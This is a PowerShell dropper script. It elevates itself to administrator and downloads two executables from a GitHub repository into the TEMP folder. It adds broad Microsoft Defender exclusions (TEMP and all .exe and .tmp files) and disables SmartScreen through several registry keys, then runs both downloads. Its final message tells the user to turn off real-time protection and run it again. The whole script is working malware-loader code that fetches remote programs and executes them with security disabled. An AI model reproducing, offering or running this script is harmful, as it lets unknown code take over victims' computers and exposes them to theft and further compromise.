Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
    $workingDirOverride = (Get-Location).Path 
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevation failed"
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -executionpolicy bypass -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

Write-Host "========================================" -ForegroundColor Yellow
Write-Host "=== DISABLING DEFENDER & SMARTSCREEN ===" -ForegroundColor Yellow
Write-Host "========================================`n" -ForegroundColor Yellow

$temp = $env:TEMP
$dest1 = "$temp\proga1.exe"
$dest2 = "$temp\proga2.exe"

# ========== STEP 1: DOWNLOAD FILES FIRST ==========
Write-Host "[1/4] Downloading files..." -ForegroundColor Cyan

function Download-File {
    param($url, $dest)
    if (Test-Path $dest) { Remove-Item $dest -Force -ErrorAction SilentlyContinue }
    try {
        Write-Host "  Downloading: $(Split-Path $dest -Leaf)" -ForegroundColor Gray
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $dest)
        $wc.Dispose()
        return $true
    } catch {
        Write-Host "  Error: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"

if (Download-File $url1 $dest1) { Write-Host "  proga1.exe: OK" -ForegroundColor Green }
if (Download-File $url2 $dest2) { Write-Host "  proga2.exe: OK" -ForegroundColor Green }

# ========== STEP 2: ADD FILES TO EXCLUSIONS ==========
Write-Host "`n[2/4] Adding files to Defender exclusions..." -ForegroundColor Cyan

try {
    # Add exclusions by path
    Add-MpPreference -ExclusionPath $dest1 -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $dest2 -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $temp -ErrorAction SilentlyContinue
    
    # Add exclusions by extension
    Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension ".tmp" -ErrorAction SilentlyContinue
    
    Write-Host "  Exclusions added successfully" -ForegroundColor Green
} catch {
    Write-Host "  Warning: Could not add exclusions via PowerShell" -ForegroundColor Yellow
}

# Alternative: Add exclusions via registry
Write-Host "  Adding exclusions via registry..." -ForegroundColor Gray
try {
    $exclusionPath = "HKLM:\Software\Microsoft\Windows Defender\Exclusions\Paths"
    if (!(Test-Path $exclusionPath)) { New-Item -Path $exclusionPath -Force | Out-Null }
    New-ItemProperty -Path $exclusionPath -Name $dest1 -Value 0 -Type DWord -Force | Out-Null
    New-ItemProperty -Path $exclusionPath -Name $dest2 -Value 0 -Type DWord -Force | Out-Null
    New-ItemProperty -Path $exclusionPath -Name $temp -Value 0 -Type DWord -Force | Out-Null
    Write-Host "  Registry exclusions added" -ForegroundColor Green
} catch {
    Write-Host "  Registry exclusions failed" -ForegroundColor DarkYellow
}

# ========== STEP 3: DISABLE SMARTSCREEN ==========
Write-Host "`n[3/4] Disabling SmartScreen..." -ForegroundColor Cyan

# Disable SmartScreen for Explorer
try {
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction Stop
    Write-Host "  Explorer SmartScreen: OFF" -ForegroundColor Green
} catch {
    Write-Host "  Failed to disable Explorer SmartScreen" -ForegroundColor Yellow
}

# Disable SmartScreen for Microsoft Edge
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Edge\SmartScreenEnabled" -Name "(Default)" -Value 0 -Force -ErrorAction Stop
    Write-Host "  Edge SmartScreen: OFF" -ForegroundColor Green
} catch {}

# Disable SmartScreen for Windows Store apps
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -Force -ErrorAction Stop
    Write-Host "  Store Apps SmartScreen: OFF" -ForegroundColor Green
} catch {}

# Disable via registry
try {
    reg add "HKLM\Software\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f 2>&1 | Out-Null
    Write-Host "  System SmartScreen: OFF" -ForegroundColor Green
} catch {}

# ========== STEP 4: RUN FILES VIA CMD ==========
Write-Host "`n[4/4] Running files via CMD..." -ForegroundColor Cyan

# Disable SmartScreen for current process
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue

function Run-FileViaCMD {
    param($path, $name)
    
    if (-not (Test-Path $path)) {
        Write-Host "  $name not found!" -ForegroundColor Red
        return $false
    }
    
    Write-Host "  Running $name..." -ForegroundColor Gray
    
    # Method 1: Direct CMD start
    try {
        cmd /c "start `"`" `"$path`"" 2>&1 | Out-Null
        Write-Host "    Started via CMD" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "    CMD method failed" -ForegroundColor DarkYellow
    }
    
    # Method 2: Using & operator
    try {
        & $path 2>&1 | Out-Null
        Write-Host "    Started via & operator" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "    & operator failed" -ForegroundColor DarkYellow
    }
    
    # Method 3: Using Invoke-Item
    try {
        Invoke-Item $path -ErrorAction Stop
        Write-Host "    Started via Invoke-Item" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "    All methods failed!" -ForegroundColor Red
        return $false
    }
}

Run-FileViaCMD $dest1 "proga1.exe"
Start-Sleep -Seconds 1
Run-FileViaCMD $dest2 "proga2.exe"

# ========== FINAL STATUS ==========
Write-Host "`n========================================" -ForegroundColor Green
Write-Host "=== COMPLETE ===" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "If files still don't run, try MANUAL method:"
Write-Host "1. Open Windows Security -> Virus & threat protection"
Write-Host "2. Click 'Manage settings'"
Write-Host "3. Turn OFF 'Real-time protection'"
Write-Host "4. Run this script again"
Write-Host ""
Write-Host "Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
